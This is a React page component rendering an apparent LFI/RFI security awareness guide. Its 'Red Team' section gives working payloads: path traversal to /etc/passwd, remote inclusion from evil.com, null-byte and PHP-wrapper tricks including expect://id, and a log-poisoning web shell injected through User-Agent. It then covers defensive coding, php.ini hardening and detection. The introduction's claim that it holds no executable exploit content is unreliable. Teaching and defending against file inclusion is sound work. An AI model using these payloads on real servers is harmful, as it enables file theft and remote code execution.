// File: /app/lfi-rfi-safe/page.tsx
export default function LfiRfiSafePage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">
        LFI/RFI Security Awareness Guide
      </h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">File Inclusion Vulnerabilities</h2>
        <p className="leading-relaxed">
          File Inclusion vulnerabilities occur when applications improperly include files without proper validation.
          This guide explains the risks and defenses without providing executable exploit content.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">Potential Impacts:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Sensitive data exposure</li>
            <li>Application source code disclosure</li>
            <li>System information leakage</li>
            <li>Possible remote code execution</li>
          </ul>
        </div>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Vulnerabilities (Offensive)</h2>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic Local File Inclusion (LFI)</h3>
          <p className="mb-3">
            Basic LFI occurs when a web application includes files from the local server based on user input without proper validation, allowing attackers to read arbitrary files on the server.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://example.com/index.php?page=../../../../etc/passwd`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Reads sensitive server files by traversing directories.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Common Techniques:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>Directory traversal using <code>../</code> sequences</li>
                <li>URL encoding to bypass filters</li>
                <li>Null byte injection (in legacy PHP versions)</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Typical Delivery Methods:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Malicious links in emails or forums</li>
                <li>Automated scanners probing for LFI</li>
                <li>Social engineering with crafted URLs</li>
              </ul>
            </div>
          </div>
        </article>


        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Basic Remote File Inclusion (RFI)</h3>
          <p className="mb-3">
            Basic RFI occurs when a web application includes external files specified via user input without proper validation, allowing attackers to execute remote code hosted on malicious servers.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://example.com/index.php?page=http://evil.com/malicious.txt`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Includes and executes remote malicious files from an attacker-controlled server.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Common Techniques:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>Using external URLs in include parameters</li>
                <li>Bypassing filters with URL encoding or null byte injection</li>
                <li>Abusing PHP wrappers like <code>expect://</code> or <code>php://input</code></li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Typical Delivery Methods:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Phishing links pointing to vulnerable endpoints</li>
                <li>Injection via vulnerable web forms or parameters</li>
                <li>Automated vulnerability scanners probing for RFI</li>
              </ul>
            </div>
          </div>
        </article>


        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Null Byte Injection</h3>
          <p className="mb-3">
            Null byte injection exploits vulnerabilities in applications—especially legacy PHP versions—by inserting a null character (%00) to prematurely terminate strings. This technique can bypass file extension checks or input validation, enabling attackers to manipulate file inclusion or path traversal.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://example.com/index.php?page=../../../../etc/passwd%00.php`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Terminates the string early to bypass `.php` extension checks and include sensitive files.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Common Usage Scenarios:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>Bypassing file extension whitelists in LFI or RFI vulnerabilities</li>
                <li>Terminating strings to evade input validation filters</li>
                <li>Combining with directory traversal for sensitive file access</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Notes:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Mostly effective on older PHP versions; modern frameworks usually mitigate this.</li>
                <li>Still relevant in poorly configured legacy applications.</li>
              </ul>
            </div>
          </div>
        </article>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. File Inclusion via Protocol Wrappers</h3>
          <p className="mb-3">
            Protocol wrappers in PHP (like <code>php://</code> or <code>expect://</code>) allow special handling of input/output streams. Attackers exploit vulnerable file inclusion parameters by using these wrappers to read, manipulate, or execute code on the server.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Payloads:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

http://example.com/index.php?page=expect://id`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Using wrappers to read source code or execute system commands.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Common Protocol Wrappers:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li><code>php://filter</code> — Read and manipulate file contents (e.g., base64 encode)</li>
                <li><code>php://input</code> — Access raw POST data for injection</li>
                <li><code>expect://</code> — Execute system commands (if enabled)</li>
                <li><code>data://</code> — Inject data directly</li>
                <li><code>zip://</code> — Access files inside zip archives</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Mitigation:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Disable unnecessary PHP wrappers in configuration</li>
                <li>Validate and whitelist input parameters strictly</li>
                <li>Use secure coding practices avoiding dynamic file includes</li>
              </ul>
            </div>
          </div>
        </article>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Log Poisoning</h3>
          <p className="mb-3">
            Log poisoning involves injecting malicious code into server log files, which are then included by vulnerable file inclusion mechanisms (like LFI). This technique can lead to remote code execution by executing attacker-controlled code stored in the logs.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Attack Workflow:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Step 1: Inject PHP code into logs via HTTP headers
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include poisoned log file via LFI
http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                This allows execution of arbitrary commands on the server by accessing the poisoned log file.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Common Targets for Log Poisoning:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>Apache and Nginx access or error logs</li>
                <li>PHP error logs</li>
                <li>Custom application logs writable by the web server</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Mitigation Strategies:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Restrict file inclusion to safe, whitelisted paths</li>
                <li>Sanitize and validate all user inputs</li>
                <li>Configure strict file permissions on log files</li>
                <li>Disable remote code execution via file inclusion</li>
              </ul>
            </div>
          </div>
        </article>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">File Inclusion Tools & Automation</h3>

          <h4 className="font-medium mb-1 mt-3">Discovery & Scanning</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>Burp Suite Scanner – Active scanning and detection of LFI/RFI vulnerabilities</li>
            <li>ffuf – Fast web fuzzer useful for directory traversal and file inclusion discovery</li>
            <li>gf Patterns – Custom patterns for LFI/RFI detection during fuzzing</li>
            <li>Nuclei – Templates available for automated file inclusion vulnerability scanning</li>
            <li>OWASP ZAP – Open-source scanner with file inclusion testing capabilities</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation & Payload Generation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>Burp Repeater – Manual payload crafting and injection for file inclusion tests</li>
            <li>Commix – Automated tool focused on command injection, useful post file inclusion RCE</li>
            <li>PHP wrappers payload collections – Prebuilt payloads using php://, expect://, data://</li>
            <li>Custom scripts – For log poisoning and null byte injection exploitation</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Post-Exploitation & Analysis</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>Burp Collaborator – Detect out-of-band interactions during exploitation</li>
            <li>Wireshark/tcpdump – Network traffic capture and analysis post exploitation</li>
            <li>Metasploit Framework – Post-exploitation modules after RCE via file inclusion</li>
            <li>Log analyzers – Tools to inspect logs for evidence of successful injection or code execution</li>
          </ul>
        </article>





      </section>











      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defensive Strategies</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Secure Coding Practices</h3>
          
          <h4 className="font-medium mb-1 mt-3">Whitelist Approach</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Safe file inclusion example
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Basename Protection</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`$file = basename($_GET['file']);
include('/templates/' . $file);`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Server Configuration</h3>
          
          <h4 className="font-medium mb-1 mt-3">PHP Hardening</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`; php.ini security settings
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html/`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Web Server Restrictions</h4>
          <div className="bg-gray-700 p-3 rounded">
            <p>Configure server to prevent access outside web root</p>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Monitoring & Detection</h3>
          
          <h4 className="font-medium mb-1 mt-3">Attack Indicators</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Multiple ../ sequences in requests</li>
            <li>Attempts to access known sensitive files</li>
            <li>PHP wrapper usage attempts</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Response Actions</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Log and block suspicious requests</li>
            <li>Review application logs</li>
            <li>Update input validation rules</li>
          </ul>
        </article>
      </section>

      <div className="mb-12 p-4 bg-gray-800 rounded-lg border-l-4 border-blue-500">
        <h3 className="text-lg font-semibold mb-2 text-blue-400">Security Best Practices</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Never include files based on unvalidated user input</li>
          <li>Use whitelists for allowed files/paths</li>
          <li>Disable dangerous PHP functions and features</li>
          <li>Configure open_basedir restrictions</li>
          <li>Regularly audit file inclusion patterns</li>
          <li>Implement proper file permissions</li>
        </ul>
      </div>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Educational Resources</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Materials</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://owasp.org/www-community/attacks/File_Inclusion" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP File Inclusion Documentation
                </a>
              </li>
              <li>
                <a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  MITRE CWE-98: PHP File Inclusion
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Defensive Guides</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP File Upload Security
                </a>
              </li>
              <li>
                <a href="https://www.php.net/manual/en/security.filesystem.php" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PHP Filesystem Security
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </main>
  );
}
